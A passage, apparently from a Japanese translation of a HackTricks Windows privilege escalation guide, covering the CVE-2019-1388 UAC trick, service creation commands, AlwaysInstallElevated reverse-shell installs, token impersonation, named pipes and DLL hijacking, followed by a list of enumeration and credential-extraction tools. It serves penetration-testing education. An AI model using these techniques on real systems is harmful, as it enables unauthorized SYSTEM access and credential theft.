7) これで「NT\AUTHORITY SYSTEM」のコマンドプロンプトが表示されます。

8) デスクトップに戻るには、セットアップとUACプロンプトをキャンセルしてください。
```

必要なすべてのファイルと情報は、以下のGitHubリポジトリにあります：

https://github.com/jas502n/CVE-2019-1388

## 管理者権限から高い整合性レベルへの移行 / UACバイパス

**整合性レベルについて学ぶ**には、次を読んでください：

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

次に、**UACおよびUACバイパスについて学ぶ**には、次を読んでください：

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **高い整合性からシステムへ**

### **新しいサービス**

すでに高い整合性プロセスで実行している場合、**新しいサービスを作成および実行**するだけで、**SYSTEMへの移行**が簡単になります。
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

**ハイインテグリティプロセスから、AlwaysInstallElevatedレジストリエントリを有効にして、.msiラッパーを使用して逆シェルをインストール**することができます。\
[関連するレジストリキーと.msiパッケージのインストール方法についての詳細はこちら。](./#alwaysinstallelevated)

### High + SeImpersonate権限をSystemに

**[こちらでコードを見つけることができます](seimpersonate-from-high-to-system.md)**。

### SeDebug + SeImpersonateからFull Token権限へ

これらのトークン権限を持っている場合（おそらくすでにHigh Integrityプロセスで見つけることができるでしょう）、SeDebug権限を持つほとんどのプロセス（保護されていないプロセスではない）を**開く**ことができ、プロセスのトークンを**コピー**し、そのトークンで**任意のプロセスを作成**することができます。\
このテクニックを使用すると、通常は**すべてのトークン権限を持つSYSTEMとして実行されているプロセスが選択**されます（はい、すべてのトークン権限を持たないSYSTEMプロセスを見つけることができます）。\
[提案されたテクニックを実行するコードの例はこちらで見つけることができます](sedebug-+-seimpersonate-copy-token.md)**。**

### Named Pipes

このテクニックは、`getsystem`でエスカレーションするためにmeterpreterによって使用されます。このテクニックは、**パイプを作成し、そのパイプに書き込むためにサービスを作成/悪用**することで構成されます。その後、**SeImpersonate**権限を使用してパイプクライアント（サービス）のトークンを**偽装**することができる**サーバー**は、SYSTEM権限を取得します。\
[名前付きパイプについて詳しく学びたい場合は、こちらを読んでください](./#named-pipe-client-impersonation)。\
[高インテグリティからSystemへの移行方法の例を読みたい場合は、こちらを読んでください](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM**で実行されている**プロセス**によって**ロード**されている**dllをハイジャック**することができれば、その権限で任意のコードを実行することができます。したがって、Dll Hijackingはこの種の特権昇格にも役立ちます。さらに、ハイインテグリティプロセスからは、dllをロードするために使用されるフォルダに**書き込み権限**があるため、**はるかに簡単に達成**することができます。\
[Dllハイジャックについて詳しく学びたい場合は、こちらを読んでください](dll-hijacking.md)**。**

### **管理者またはネットワークサービスからSystemへ**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOCAL SERVICEまたはNETWORK SERVICEからフル権限へ

**読む:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## その他のヘルプ

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windowsローカル特権昇格ベクトルを探すための最高のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスと機密ファイルをチェック（**[**こちらを確認**](../../windows/windows-local-privilege-escalation/broken-reference/)**）。検出されました。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な設定ミスをチェックし、情報を収集（**[**こちらを確認**](../../windows/windows-local-privilege-escalation/broken-reference/)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェック**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、およびRDPの保存されたセッション情報を抽出します。ローカルで -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 資格情報をCredential Managerから抽出します。検出されました。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体にスプレーします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell ADIDNS/LLMNR/mDNS/NBNSスプーファーおよび中間者ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な特権昇格Windows列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 既知の特権昇格脆弱性を検索（Watson用に非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **（管理者権限が必要）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の特権昇格脆弱性を検索（VisualStudioを使用してコンパイルする必要があります）（[**事前コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙し、設定ミスを検索します（特権昇格よりも情報収集ツール）（コンパイルが必要） **（**[**事前コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトウェアから資格情報を抽出します（githubに事前コンパイルされたexeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#ポート**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 設定ミスをチェック（githubに事前コンパイルされた実行可能ファイルがあります）。Win10ではうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な設定ミスをチェック（pythonからのexe）。Win10ではうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿を基に作成されたツール（適切に機能させるためにaccesschkは必要ありませんが、使用することができます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するエクスプロイトを推奨します（ローカルpython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するエクスプロイトを推奨します（ローカルpython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

被害者ホストで正しい.NETのバージョンを使用してプロジェクトをコンパイルする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストでインストールされている.NETのバージョンを確認するには、次の操作を行います：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考文献

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
[https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\
[https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
[https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで企業を宣伝**したいですか？または、**最新版のPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れましょう
* **💬** [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォロー[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングトリックを共有するために** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
